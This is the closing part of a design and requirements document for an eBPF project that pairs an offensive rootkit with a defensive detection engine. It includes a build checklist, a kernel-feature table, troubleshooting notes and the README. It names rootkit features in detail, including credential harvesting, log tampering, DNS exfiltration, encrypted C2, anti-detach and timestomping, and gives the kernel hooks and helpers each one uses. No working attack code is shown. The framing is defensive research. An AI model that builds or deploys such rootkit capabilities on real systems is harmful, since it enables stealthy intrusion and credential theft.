- [ ] Create root `Cargo.toml` (Section 4.2)
- [ ] Create `.cargo/config.toml` (Section 4.3)
- [ ] Create `verify-env.sh` (Section 3.4)
- [ ] Create `Makefile` (Section 8.4)
- [ ] Create `README.md` (Section 14)

### Step 2: Common Crate
**Build first — everything depends on this.**
- [ ] Create `common/Cargo.toml` (Section 5.1)
- [ ] Create `common/src/lib.rs` (Section 5.2)
- [ ] Verify: `cargo check --package common`

### Step 3: Build System (can parallel with Step 2)
- [ ] Create `xtask/Cargo.toml` (Section 8.1)
- [ ] Create `xtask/src/main.rs` (Section 8.2)
- [ ] Verify: `cargo check --package xtask`

### Step 4: Offense eBPF Programs
**Kernel-space code. Must compile to BPF target.**
- [ ] Create `offense-ebpf/Cargo.toml` (Section 6.1)
- [ ] Create `offense-ebpf/src/main.rs` (Section 6.2)
- [ ] Verify: `cargo xtask build-ebpf --release` (offense only)

### Step 5: Offense User-Space Loader
- [ ] Create `offense/Cargo.toml` (Section 6.3)
- [ ] Create `offense/build.rs` (Section 8.3)
- [ ] Create `offense/src/main.rs` (Section 6.4)
- [ ] Verify: `cargo build --package offense`

### Step 6: Test Feature 1 (Process Hiding)
- [ ] Follow Phase 3 test plan (Section 10.3)
- [ ] Test dry-run mode: `sudo ./target/release/offense --dry-run hide-pid --pid 1234`
- [ ] Test privilege error: run without sudo, verify clear error message
- [ ] Fix any issues before proceeding

### Step 7: Implement Remaining Offense Features
- [ ] Complete `run_net_stealth()` in offense/src/main.rs (with C2 command dispatch)
- [ ] Complete `run_full()` in offense/src/main.rs
- [ ] Implement telemetry muting (fallback kprobe or fmod_ret based on kernel support)
- [ ] Implement credential harvesting: complete `run_cred_harvest()` and `shadow_cred_harvest` eBPF program
- [ ] Implement log tampering: complete `shadow_tamper_logs` eBPF enter/exit pair
- [ ] Implement process ancestry spoofing: complete `shadow_spoof_ancestry` eBPF program and `run_spoof_ancestry()`
- [ ] Implement DNS exfiltration: complete TC classifier `shadow_dns_exfil` and `run_dns_exfil()`
- [ ] Implement kallsyms hiding: complete `shadow_hide_kallsyms` eBPF program
- [ ] Implement anti-detach: verify `shadow_anti_detach` tracepoint fires on bpf() syscall; implement re-attach logic in user-space event loop
- [ ] Implement encrypted C2: integrate `chacha8_block()` into XDP program for payload decryption; update C2 sender tool to encrypt with ChaCha8
- [ ] Implement timestomping: complete `shadow_timestomp` eBPF program and `run_timestomp()`
- [ ] Test each feature (Sections 10.4)
- [ ] Test kill-switch (Section 10.7)

### Step 8: Defense eBPF Programs
- [ ] Create `defense-ebpf/Cargo.toml` (Section 7.1)
- [ ] Create `defense-ebpf/src/main.rs` (Section 7.2) — multi-syscall latency monitor
- [ ] Verify: `cargo xtask build-ebpf --release` (defense)

### Step 9: Defense User-Space Engine
- [ ] Create `defense/Cargo.toml` (Section 7.3) — includes bytes, procfs deps
- [ ] Create `defense/build.rs` (Section 8.3)
- [ ] Create `defense/src/main.rs` (Section 7.4) — full detection engine with --json, --threshold
- [ ] Create `defense/src/ghost_map_audit.rs` (Section 7.5) — with metadata heuristics
- [ ] Create `defense/src/integrity_check.rs` (Section 7.6) — expanded helpers + hook audit
- [ ] Create `defense/src/hidden_process_detector.rs` (Section 7.7) — Module 4
- [ ] Create `defense/src/net_audit.rs` (Section 7.8) — Module 5
- [ ] Verify: `cargo build --package defense`

### Step 10: Verify Defense Features
- [ ] Test ghost-maps scan with metadata heuristics (Section 10.5a)
- [ ] Test integrity-check detects bpf_probe_write_user/kernel (Section 10.5a)
- [ ] Test hook-audit detects rootkit attachments (Section 10.5a)
- [ ] Test hidden-procs detects hidden PIDs (Section 10.5b)
- [ ] Test net-audit detects XDP/TC attachments (Section 10.5c)
- [ ] Test baseline calibrates per-syscall latency (Section 10.5d)
- [ ] Test monitor detects latency anomalies with rate-limiting (Section 10.5e)
- [ ] Test --json output is valid JSON (Section 10.5f)
- [ ] Test quarantine detaches programs (Section 10.5g)
- [ ] Test audit aggregates results and returns correct exit codes
- [ ] Verify bpftool error messages are clear when bpftool is missing

### Step 11: Integration Testing
- [ ] Run full test sequence (Section 10.6 — Persistence Test)
- [ ] Run kill-switch test (Section 10.7)
- [ ] Run dry-run test (Section 10.8)
- [ ] Verify offense and defense work simultaneously
- [ ] Document any kernel-version-specific issues encountered

### Step 12: Automated Tests
- [ ] Create `offense/tests/integration.rs` (Section 10.9)
- [ ] Create `defense/tests/integration.rs` (Section 10.9)
- [ ] Run: `cargo test --package offense --package defense`
- [ ] Run with root: `sudo cargo test --package offense --package defense -- --test-threads=1`

### Step 13: Polish
- [ ] Ensure all `TODO: IMPLEMENT` blocks are completed
- [ ] Verify `cargo clippy` passes on user-space crates
- [ ] Verify all tests in Section 10 pass
- [ ] Verify README.md is accurate and complete

---

## 13. Safety & Ethics

> **WARNING**: This project is for **educational and research purposes only**.

### Rules of Engagement
1. **ALL development and testing MUST occur within isolated virtual machines.**
2. **NEVER run the offensive module on production systems, shared networks, or systems you do not own.**
3. The VM MUST use a host-only network adapter during testing.
4. Do NOT distribute the compiled rootkit binaries.
5. This project demonstrates attack techniques **solely** to build better defenses.

### Legal Notice
Unauthorized deployment of rootkits or kernel-level malware is illegal under the Computer Fraud and Abuse Act (US), Computer Misuse Act (UK), and equivalent laws in most jurisdictions. The authors assume no liability for misuse.

---

## Appendix A: Kernel Feature Requirements Per Feature

| Feature | Minimum Kernel | Required Config | BPF Helper |
|---|---|---|---|
| Process Hiding (kretprobe) | 4.1+ | `CONFIG_BPF_EVENTS=y` | `bpf_probe_write_user` |
| Network Stealth (XDP) | 4.8+ | `CONFIG_XDP_SOCKETS=y` | — |
| File Obfuscation (kprobe) | 4.1+ | `CONFIG_BPF_EVENTS=y` | `bpf_probe_write_user` |
| Telemetry Muting v1 (kprobe fallback) | 4.1+ | `CONFIG_BPF_EVENTS=y` | — |
| Telemetry Muting v2 (fmod_ret) | 5.7+ | `CONFIG_BPF_LSM=y` | `bpf_override_return` |
| Persistence (pinning) | 4.11+ | `CONFIG_BPF_SYSCALL=y` | — |
| Credential Harvesting (kprobe sys_write) | 4.1+ | `CONFIG_BPF_EVENTS=y` | `bpf_probe_read_kernel` |
| Log Tampering (kretprobe do_syslog) | 4.1+ | `CONFIG_BPF_EVENTS=y` | `bpf_probe_write_user` |
| Process Ancestry Spoofing (kretprobe vfs_read) | 4.1+ | `CONFIG_BPF_EVENTS=y` | `bpf_probe_write_user` |
| DNS Exfiltration (TC classifier) | 4.1+ | `CONFIG_NET_CLS_BPF=y` | `bpf_skb_store_bytes` |
| Kallsyms Hiding (kretprobe vfs_read) | 4.1+ | `CONFIG_BPF_EVENTS=y` | `bpf_probe_write_user` |
| Anti-Detach (tracepoint sys_enter_bpf) | 4.7+ | `CONFIG_BPF_EVENTS=y` | — |
| Encrypted C2 (ChaCha8 in XDP) | 4.8+ | `CONFIG_XDP_SOCKETS=y` | — |
| Timestomping (kretprobe vfs_getattr) | 5.8+ | `CONFIG_BPF_EVENTS=y` | `bpf_probe_write_kernel` |
| Latency Monitor (fentry) | 5.5+ | `CONFIG_DEBUG_INFO_BTF=y` | `bpf_ktime_get_ns` |
| Ghost Map Audit | any | — | — (user-space only) |
| Bytecode Check | any | — | — (user-space only) |

## Appendix B: Troubleshooting

| Issue | Solution |
|---|---|
| `bpf-linker` fails to install | Ensure `llvm` and `libelf-dev` are installed. Try: `apt install llvm-dev` |
| "BTF not found" error | Install debug kernel: `apt install linux-image-$(uname -r)-dbgsym` |
| eBPF verifier rejects program | Check for unbounded loops. All loops must have a fixed upper bound (`for i in 0..128`) |
| "Permission denied" loading BPF | Run with `sudo`. Or set `CAP_BPF` + `CAP_PERFMON` on the binary. |
| XDP program fails to attach | Try `XdpFlags::SKB_MODE` instead of default. Some VMs don't support native XDP. |
| `include_bytes_aligned!` not found | Use `aya::include_bytes_aligned!` macro or load from file path with `Ebpf::load_file()` |
| fentry/fexit not available | Requires kernel 5.5+ with BTF. Check: `bpftool feature probe | grep fentry` |
| Ghost map scan finds 0 maps | Normal if no BPF programs are loaded. Load the rootkit first, then scan. |
| `build.rs` fails with "offense-ebpf build failed" | Ensure nightly toolchain is installed: `rustup toolchain install nightly`. Ensure `bpf-linker` is installed: `cargo install bpf-linker`. |
| HMAC validation always fails | Ensure C2 sender uses the same `C2_HMAC_KEY` and computes HMAC over `MAGIC_BYTES + CommandPayload` (20 bytes). |
| Kill-switch doesn't detach all programs | Some programs may have been renamed. Use `bpftool prog list` to find remaining programs manually. |

---

## 14. README.md Content

> Create this file as `aegis-shadow/README.md`.

```markdown
# Project Aegis-Shadow

> **Dual-Path eBPF Research: Programmable Rootkits vs. Runtime Observability Shields**

## Overview

Aegis-Shadow is an educational research project that demonstrates both offensive and
defensive uses of Linux eBPF technology. It consists of two modules:

- **Shadow** (Offense): An eBPF-based rootkit that can hide processes, intercept
  network traffic via XDP, obfuscate file reads, and persist across loader restarts.
- **Aegis** (Defense): A runtime security shield that detects ghost BPF maps,
  monitors syscall latency anomalies, and audits loaded BPF programs for dangerous
  helper usage.

## ⚠️ Safety Warning

**This project is for educational and research purposes only.**

- ALL development and testing MUST occur within isolated virtual machines.
- NEVER run the offensive module on production systems, shared networks, or systems you do not own.
- The VM MUST use a host-only network adapter during testing.
- Do NOT distribute compiled rootkit binaries.

## Requirements

- **Host**: macOS with UTM or QEMU
- **Guest VM**: Ubuntu 24.04 LTS, Linux Kernel 6.8+
- **Rust**: Nightly toolchain
- **Tools**: bpf-linker, bpftool, clang, llvm, libelf-dev

## Quick Start

```bash
# 1. Set up VM and verify environment
bash verify-env.sh

# 2. Build everything
make build

# 3. Test process hiding (in VM, as root)
sleep 99999 &
sudo ./target/release/offense hide-pid --pid $!

# 4. Run defense audit (in another terminal)
sudo ./target/release/defense audit

# 5. Emergency teardown
sudo ./target/release/offense kill-switch
```

## Project Structure

| Directory | Purpose |
|---|---|
| `common/` | Shared data structures (eBPF + user-space) |
| `offense-ebpf/` | Kernel-space rootkit eBPF programs |
| `offense/` | User-space rootkit loader and CLI |
| `defense-ebpf/` | Kernel-space defensive eBPF probes |
| `defense/` | User-space detection engine and CLI |
| `xtask/` | Build automation |

## Offense CLI

```
sudo ./target/release/offense [--dry-run] <COMMAND>

Commands:
  hide-pid       Hide a process by PID
  net-stealth    Enable network stealth (XDP)
  full           Run all features
  cleanup        Remove pinned BPF programs
  kill-switch    Emergency: detach ALL programs
```

## Defense CLI

```
sudo ./target/release/defense [OPTIONS] <COMMAND>

Options:
  --json              Output as JSON lines (SIEM/CI integration)
  --threshold <FLOAT> Latency threshold multiplier (default: 1.3)

Commands:
  audit            Full audit (ghost maps + integrity + hooks + hidden procs + net)
  baseline         Calibrate multi-syscall latency baseline
  monitor          Real-time multi-syscall latency monitoring
  ghost-maps       Scan for orphaned BPF maps + metadata heuristics
  integrity-check  Audit BPF program bytecode for dangerous helpers
  hook-audit       Audit BPF programs on sensitive kernel hooks
  hidden-procs     Detect processes hidden from /proc enumeration
  net-audit        Scan for rogue XDP/TC network attachments
  quarantine <IDs> Detach and unpin suspicious BPF programs
```

## Running Tests

```bash
# Unit tests (no root required)
cargo test --package offense --package defense

# Integration tests (root required, in VM)
sudo cargo test --package offense --package defense -- --test-threads=1
```

## License

This project is provided for educational purposes only. See Section 13 of the PRD
for full safety and legal guidelines.
```

---

*End of PRD. This document contains all information needed to build Project Aegis-Shadow from scratch.*
